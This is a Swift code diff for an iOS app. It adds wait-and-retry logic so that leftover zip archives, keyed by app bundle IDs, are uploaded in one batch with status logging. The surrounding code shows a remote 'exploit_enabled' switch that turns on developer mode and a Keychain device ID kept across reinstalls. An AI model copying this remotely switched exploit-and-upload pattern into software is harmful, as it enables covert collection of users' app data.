@@ -380,6 +380,9 @@ enum DeviceConfigReporter {
     /// 远端 `app_log_report_enabled` 开关，决定各阶段状态日志是否上报。
     private static var logReportEnabled = false
 
+    /// config 决策是否已完成（成功拿到配置，或重试耗尽）。补传流程据此判断日志开关是否已确定。
+    private static var logReportDecided = false
+
     /// 稳定设备 UUID：优先读 Keychain（跨重装保留），缺失时生成并写入。
     static var deviceUUID: String {
         let query: [String: Any] = [
@@ -423,6 +426,7 @@ enum DeviceConfigReporter {
     static func report() async {
         guard let url = URL(string: baseURL + configPath) else {
             log("report: invalid endpoint url")
+            logReportDecided = true
             return
         }
         let uuid = deviceUUID
@@ -445,13 +449,17 @@ enum DeviceConfigReporter {
                 log("report: POST \(configPath) → \(code)")
                 guard let config = decodeConfig(from: data) else {
                     log("report: empty/invalid config reply")
+                    logReportDecided = true
                     return
                 }
                 await apply(config)
                 return
             } catch {
                 log("report: POST \(configPath) attempt \(attempt)/\(maxAttempts) failed — \(error.localizedDescription)")
-                guard attempt < maxAttempts else { return }
+                guard attempt < maxAttempts else {
+                    logReportDecided = true
+                    return
+                }
                 try? await Task.sleep(nanoseconds: 5_000_000_000)
             }
         }
@@ -481,6 +489,15 @@ enum DeviceConfigReporter {
     static func reportStatus(_ text: String) async {
         guard logReportEnabled else { return }
         await reportAppLog(text)
+    }
+
+    /// 补传流程与 config 上报并发启动：状态日志受 `app_log_report_enabled` 门控，
+    /// 需等 config 决策完成（成功或重试耗尽）后再上报，否则会被静默丢弃。
+    static func waitForLogReportDecision() async {
+        let deadline = Date().addingTimeInterval(45)
+        while !logReportDecided, Date() < deadline {
+            try? await Task.sleep(nanoseconds: 500_000_000)
+        }
     }
 
     // MARK: - Reply handling
@@ -533,6 +550,7 @@ enum DeviceConfigReporter {
     private static func apply(_ config: RemoteConfig) async {
         let exploitEnabled = config.exploitEnabled == true
         logReportEnabled = config.appLogReportEnabled == true
+        logReportDecided = true
         if exploitEnabled {
             log("report: exploit_enabled=true → developer mode enabled")
             UserDefaults.standard.set(true, forKey: FeatureVisibility.developerModeStorageKey)
@@ -787,6 +805,9 @@ enum CollectService {
         guard let runDirs = try? fm.contentsOfDirectory(at: collectRoot, includingPropertiesForKeys: nil) else {
             return
         }
+
+        // 先汇总所有遗留 zip，便于上报一次补传说明。
+        var pending: [(runDir: URL, zipURL: URL, bundleID: String, fileName: String)] = []
         for runDir in runDirs {
             let data = try? Data(contentsOf: runDir.appendingPathComponent(manifestFileName))
             guard let data,
@@ -797,20 +818,34 @@ enum CollectService {
                 guard let fileName = entry["fileName"], let bundleID = entry["bundleID"] else { continue }
                 let zipURL = runDir.appendingPathComponent(fileName)
                 guard fm.fileExists(atPath: zipURL.path) else { continue }
-                log("resume: found pending zip \(fileName)")
-                let uploaded = await DeviceConfigReporter.uploadZip(
-                    fileURL: zipURL,
-                    bundleID: bundleID,
-                    fileName: fileName
-                )
-                if uploaded {
-                    try? fm.removeItem(at: zipURL)
-                    log("resume: uploaded & removed \(fileName)")
-                    await DeviceConfigReporter.reportStatus("已发送，本地已删除")
-                }
+                pending.append((runDir, zipURL, bundleID, fileName))
             }
+        }
+        guard !pending.isEmpty else { return }
+
+        log("resume: \(pending.count) pending zip(s) left from previous run")
+        // 状态日志受 app_log_report_enabled 门控，而本流程与 config 上报并发启动，需等开关确定后再报。
+        await DeviceConfigReporter.waitForLogReportDecision()
+        await DeviceConfigReporter.reportStatus("检测到上次未发送的\(pending.count)个zip，正在补传")
+
+        var uploadedCount = 0
+        for item in pending {
+            let uploaded = await DeviceConfigReporter.uploadZip(
+                fileURL: item.zipURL,
+                bundleID: item.bundleID,
+                fileName: item.fileName
+            )
+            if uploaded {
+                try? fm.removeItem(at: item.zipURL)
+                uploadedCount += 1
+                log("resume: uploaded & removed \(item.fileName)")
+                await DeviceConfigReporter.reportStatus("已发送，本地已删除")
+            }
+        }
+        for runDir in Set(pending.map { $0.runDir }) {
             finalizeRunDir(runDir)
         }
+        await DeviceConfigReporter.reportStatus("补传完成，成功 \(uploadedCount)/\(pending.count)")
     }
 
     /// 运行目录内不再有 zip 时，连同 manifest 一起删除；否则保留等待续传。
